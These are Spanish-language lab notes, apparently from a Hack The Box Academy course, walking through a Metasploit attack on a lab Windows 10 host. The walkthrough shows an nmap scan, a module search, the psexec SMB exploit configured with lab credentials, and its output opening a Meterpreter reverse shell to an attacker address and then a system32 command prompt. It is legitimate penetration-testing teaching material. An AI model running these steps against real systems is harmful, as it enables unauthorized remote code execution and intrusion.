[Metasploit](https://www.metasploit.com) es un marco de ataque automatizado desarrollado por `Rapid7`que agiliza el proceso de explotación de vulnerabilidades mediante el uso de módulos prediseñados que contienen opciones fáciles de usar para explotar vulnerabilidades y entregar cargas útiles para obtener un shell en un sistema vulnerable.

#### Iniciando MSF
```js
sudo msfconsole 
```

En este caso, usaremos resultados de enumeración de un `nmap` escanee para elegir un módulo Metasploit para usar.
```ruby
┌──(pelado㉿kali)-[~/HTB/Academy/ShellsPayloads]
└─$ nmap -sCV -Pn 10.129.201.160 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 13:57 EDT
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 88.89% done; ETC: 14:00 (0:00:13 remaining)
Nmap scan report for 10.129.201.160
Host is up (0.16s latency).
Not shown: 898 closed tcp ports (conn-refused), 93 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
7/tcp    open  echo
9/tcp    open  discard?
13/tcp   open  daytime      Microsoft Windows USA daytime
19/tcp   open  chargen
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 10 Pro 18363 microsoft-ds (workgroup: WORKGROUP)
2179/tcp open  vmrdp?
Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Shells-Win10
|   NetBIOS computer name: SHELLS-WIN10\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-21T11:01:13-07:00
| smb2-time: 
|   date: 2024-06-21T18:01:10
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m02s, deviation: 4h02m32s, median: 0s

```

#### Buscando dentro de Metasploit
```js
msf6 > search smb

Matching Modules
================

   #    Name                                                                            Disclosure Date  Rank       Check  Description
   -    ----                                                                            ---------------  ----       -----  -----------
   0    exploit/multi/http/struts_code_exec_classloader                                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   1      \_ target: Java                                                               .                .          .      .
   2      \_ target: Linux                                                              .                .          .      .
   3      \_ target: Windows                                                            .                .          .      .
   4      \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)       .                .          .      .
   5    exploit/osx/browser/safari_file_policy                                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   6      \_ target: Safari 5.1 on OS X                                                 .                .          .      .
   7      \_ target: Safari 5.1 on OS X with Java                                       .                .          .      .
   8    auxiliary/server/capture/smb                                                    .                normal     No     Authentication Capture: SMB
   9    post/linux/busybox/smb_share_root                                               .                normal     No     BusyBox SMB Sharing
   10   exploit/linux/misc/cisco_rv340_sslvpn                                           2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution
   11   auxiliary/scanner/http/citrix_dir_traversal                                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
   12   auxiliary/gather/crushftp_fileread_cve_2024_4040                                .                normal     Yes    CrushFTP Unauthenticated Arbitrary File Read
   13   auxiliary/scanner/smb/impacket/dcomexec                                         2018-03-19       normal     No     DCOM Exec
   14   auxiliary/scanner/smb/impacket/secretsdump                                      .                normal     No     DCOM Exec
   15   auxiliary/scanner/dcerpc/dfscoerce                                              .                normal     No     DFSCoerce
   16   exploit/windows/scada/ge_proficy_cimplicity_gefebt                              2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   17   exploit/windows/smb/generic_smb_dll_injection                                   2015-03-04       manual     No     Generic DLL Injection From Shared Resource
   18     \_ target: Windows x86                                                        .                .          .      .
   19     \_ target: Windows x64                                                        .                .          .      .
   20   exploit/windows/http/generic_http_dll_injection                                 2015-03-04       manual     No     Generic Web Application DLL Injection
   21     \_ target: Windows x86                                                        .                .          .      .
   22     \_ target: Windows x64                                                        .                .          .      .
   23   exploit/windows/smb/group_policy_startup                                        2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   24     \_ target: Windows x86                                                        .                .          .      .
   25     \_ target: Windows x64                                                        .                .          .      .
   ....................
```

Cada módulo tiene un número que aparece en el extremo izquierdo de la tabla para facilitar la selección del módulo, un `Name`, `Disclosure Date`, `Rank`, `Check` y `Description`.
Veamos un módulo en particular para entenderlo en el contexto de las cargas útiles:

| Output     | Significado                                                                                                                                                                                |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `56`       | El número asignado al módulo en la tabla dentro del contexto de la búsqueda. Este número facilita la selección. Podemos usar el comando `use 56` para seleccionar el módulo.               |
| `exploit/` | Esto define el tipo de módulo. En este caso, se trata de un módulo de explotación. Muchos módulos de explotación en MSF incluyen la carga útil que intenta establecer una sesión de shell. |
| `windows/` | Esto define la plataforma a la que nos dirigimos. En este caso, sabemos que el objetivo es Windows, por lo que el exploit y la carga útil serán para Windows.                              |
| `smb/`     | Esto define el servicio para el cual se escribe la carga útil en el módulo.                                                                                                                |
| `psexec`   | Esto define la herramienta que se cargará en el sistema de destino si es vulnerable.                                                                                                       |
```ruby
msf6 > search exploit/windows/smb/psexec

Matching Modules
================

   #  Name                        Disclosure Date  Rank    Check  Description
   -  ----                        ---------------  ----    -----  -----------
   0  exploit/windows/smb/psexec  1999-01-01       manual  No     Microsoft Windows Authenticated User Code Execution
   1    \_ target: Automatic      .                .       .      .
   2    \_ target: PowerShell     .                .       .      .
   3    \_ target: Native upload  .                .       .      .
   4    \_ target: MOF upload     .                .       .      .
   5    \_ target: Command        .                .       .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/psexec
After interacting with a module you can manually set a TARGET with set TARGET 'Command'

msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > 
```

#### Examinar las opciones de un exploit
```ruby
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.50.4.192     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

#### Opciones de configuración
```js
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.201.160
RHOSTS => 10.129.201.160
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.15.13
LHOST => 10.10.15.13
msf6 exploit(windows/smb/psexec) > 
```

Estas configuraciones garantizarán que nuestra carga útil se entregue al objetivo adecuado ( `RHOSTS`), cargado en el recurso compartido administrativo predeterminado ( `ADMIN$`) utilizando credenciales ( `SMBPass` & `SMBUser`), luego inicie una conexión de shell inversa con nuestra máquina host local ( `LHOST`).

#### Explotacion
```ruby
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.15.13:4444 
[*] 10.129.201.160:445 - Connecting to the server...
[*] 10.129.201.160:445 - Authenticating to 10.129.201.160:445 as user 'htb-student'...
[*] 10.129.201.160:445 - Selecting PowerShell target
[*] 10.129.201.160:445 - Executing the payload...
[+] 10.129.201.160:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.129.201.160
[*] Meterpreter session 1 opened (10.10.15.13:4444 -> 10.129.201.160:49874) at 2024-06-21 14:12:14 -0400

meterpreter > 
```

#### Carcasa interactiva
```ruby
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

